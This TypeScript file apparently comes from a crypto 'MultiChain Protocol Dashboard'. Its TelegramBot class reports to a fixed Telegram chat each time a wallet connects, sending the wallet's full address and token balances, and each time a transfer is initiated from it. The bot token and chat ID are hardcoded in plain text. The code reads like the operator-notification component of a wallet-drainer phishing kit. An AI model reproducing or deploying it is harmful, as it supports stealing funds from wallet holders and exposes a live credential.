interface TelegramMessage {
  chat_id: string | number
  text: string
  parse_mode?: "HTML" | "Markdown"
  disable_web_page_preview?: boolean
}

interface WalletNotification {
  address: string
  chainName: string
  chainId: number
  nativeBalance: string
  nativeSymbol: string
  tokens: Array<{
    symbol: string
    balance: string
    name: string
    address?: string
  }>
  timestamp: string
}

export class TelegramBot {
  private botToken: string
  private chatId: string

  constructor(botToken: string, chatId: string) {
    this.botToken = botToken
    this.chatId = chatId
  }

  private async sendMessage(message: TelegramMessage): Promise<boolean> {
    try {
      const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      })

      const result = await response.json()

      if (!response.ok) {
        console.error("Telegram API error:", result)
        return false
      }

      return result.ok
    } catch (error) {
      console.error("Failed to send Telegram message:", error)
      return false
    }
  }

  async sendWalletConnectionNotification(data: WalletNotification): Promise<boolean> {
    const formatBalance = (balance: string, symbol: string) => {
      const num = Number.parseFloat(balance)
      if (num === 0) return `0 ${symbol}`
      if (num < 0.000001) return `<0.000001 ${symbol}`
      return `${num.toFixed(6)} ${symbol}`
    }

    const formatAddress = (address: string) => {
      return `${address.slice(0, 6)}...${address.slice(-4)}`
    }

    // Create token list
    const tokenList = data.tokens
      .filter((token) => Number.parseFloat(token.balance) > 0)
      .map((token) => `  • ${formatBalance(token.balance, token.symbol)}`)
      .join("\n")

    const noTokensMessage = data.tokens.every((token) => Number.parseFloat(token.balance) === 0)
      ? "\n  • No ERC-20 tokens found"
      : ""

    const message = `🔗 <b>New Wallet Connected!</b>

📍 <b>Address:</b> <code>${formatAddress(data.address)}</code>
🌐 <b>Network:</b> ${data.chainName}
⏰ <b>Time:</b> ${data.timestamp}

💰 <b>Native Balance:</b>
  • ${formatBalance(data.nativeBalance, data.nativeSymbol)}

🪙 <b>ERC-20 Tokens:</b>${noTokensMessage}
${tokenList}

🔍 <b>Full Address:</b> <code>${data.address}</code>

---
<i>MultiChain Protocol Dashboard</i>`

    return await this.sendMessage({
      chat_id: this.chatId,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    })
  }

  async sendTransferNotification(data: {
    address: string
    token: string
    amount: string
    txHash: string
    chainName: string
    timestamp: string
    type: "native" | "erc20"
  }): Promise<boolean> {
    const formatAddress = (address: string) => {
      return `${address.slice(0, 6)}...${address.slice(-4)}`
    }

    const formatTxHash = (hash: string) => {
      return `${hash.slice(0, 10)}...${hash.slice(-8)}`
    }

    const message = `💸 <b>Transfer Initiated!</b>

👤 <b>From:</b> <code>${formatAddress(data.address)}</code>
🪙 <b>Token:</b> ${data.token}
💰 <b>Amount:</b> ${data.amount}
🌐 <b>Network:</b> ${data.chainName}
📝 <b>Type:</b> ${data.type === "native" ? "Native Token" : "ERC-20 Token"}
⏰ <b>Time:</b> ${data.timestamp}

🔗 <b>Transaction:</b> <code>${formatTxHash(data.txHash)}</code>

---
<i>MultiChain Protocol Dashboard</i>`

    return await this.sendMessage({
      chat_id: this.chatId,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    })
  }

  async sendErrorNotification(error: string, context?: string): Promise<boolean> {
    const message = `❌ <b>Error Notification</b>

🚨 <b>Error:</b> ${error}
${context ? `📍 <b>Context:</b> ${context}` : ""}
⏰ <b>Time:</b> ${new Date().toISOString()}

---
<i>MultiChain Protocol Dashboard</i>`

    return await this.sendMessage({
      chat_id: this.chatId,
      text: message,
      parse_mode: "HTML",
    })
  }

  // Test the bot connection
  async testConnection(): Promise<boolean> {
    try {
      const response = await fetch(`https://api.telegram.org/bot${this.botToken}/getMe`)
      const result = await response.json()
      return result.ok
    } catch (error) {
      console.error("Failed to test Telegram bot connection:", error)
      return false
    }
  }
}

// Utility function to create bot instance
export function createTelegramBot(): TelegramBot | null {
  const botToken = "7333818064:AAGFQmDsIWS2y3iRwiWCtRpQ6bzZSdUouEo"
  const chatId = "-4900724350"
    // const chatId = "1374918767" // Replace with your actual chat ID

  if (!botToken || !chatId) {
    console.warn("Telegram bot credentials not configured")
    return null
  }

  return new TelegramBot(botToken, chatId)
}
